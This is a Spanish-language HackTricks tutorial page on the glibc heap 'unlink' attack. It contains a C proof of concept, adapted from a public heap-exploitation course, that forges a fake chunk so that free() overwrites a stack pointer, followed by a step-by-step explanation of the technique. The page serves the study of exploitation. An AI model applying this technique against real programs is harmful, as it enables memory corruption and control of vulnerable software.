# Ataque Unlink

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Informaci칩n B치sica

Cuando se descubri칩 este ataque, principalmente permit칤a un WWW (Write What Where), sin embargo, se agregaron algunas **verificaciones** haciendo que la nueva versi칩n del ataque sea m치s interesante y m치s compleja y **in칰til**.

### Ejemplo de C칩digo:

<details>

<summary>C칩digo</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* El ataque no funciona si se utilizan tcaches

### Objetivo

* Modificar un puntero a un fragmento en la pila para que apunte a la pila y sea posible alterar el contenido de la pila escribiendo en el fragmento

### Requisitos

* Alg칰n control en una memoria (por ejemplo, pila) para crear un par de fragmentos dando valores a algunos de los atributos.
* Fuga de pila para establecer los punteros del fragmento falso.

### Ataque

* Hay un par de fragmentos (fragmento1 y fragmento2)
* El atacante controla el contenido del fragmento1 y los encabezados del fragmento2.
* En el fragmento1, el atacante crea la estructura de un fragmento falso:
* Para evitar protecciones, se asegura de que el campo `size` sea correcto para evitar el error: `corrupted size vs. prev_size while consolidating`
* y los campos `fd` y `bk` del fragmento falso apuntan a donde se almacena el puntero del fragmento1 en la pila con desplazamientos de -3 y -2 respectivamente, de modo que `fake_chunk->fd->bk` y `fake_chunk->bk->fd` apunten a la posici칩n en la memoria (pila) donde se encuentra la direcci칩n real del fragmento1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Los encabezados del fragmento2 se modifican para indicar que el fragmento anterior no se est치 utilizando y que el tama침o es el tama침o del fragmento falso contenido.
* Cuando se libera el segundo fragmento, entonces este fragmento falso se desvincula sucediendo:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Anteriormente se hizo que `fake_chunk->fd->bk` y `fake_chunk->fd->bk` apunten al mismo lugar (la ubicaci칩n en la pila donde se almacenaba `fragmento1`, por lo que era una lista enlazada v치lida). Como **ambos apuntan al mismo lugar**, solo el 칰ltimo (`fake_chunk->bk->fd = fake_chunk->fd`) tendr치 **efecto**.
* Esto **sobrescribir치 el puntero al fragmento1 en la pila a la direcci칩n (o bytes) almacenados 3 direcciones antes en la pila**.
* Por lo tanto, si un atacante pudiera controlar nuevamente el contenido del fragmento1, podr치 **escribir dentro de la pila**, pudiendo potencialmente sobrescribir la direcci칩n de retorno saltando el canary y modificar los valores y puntos de las variables locales. Incluso modificando nuevamente la direcci칩n del fragmento1 almacenada en la pila a una ubicaci칩n diferente donde si el atacante pudiera controlar nuevamente el contenido del fragmento1, podr치 escribir en cualquier lugar.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Referencias

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
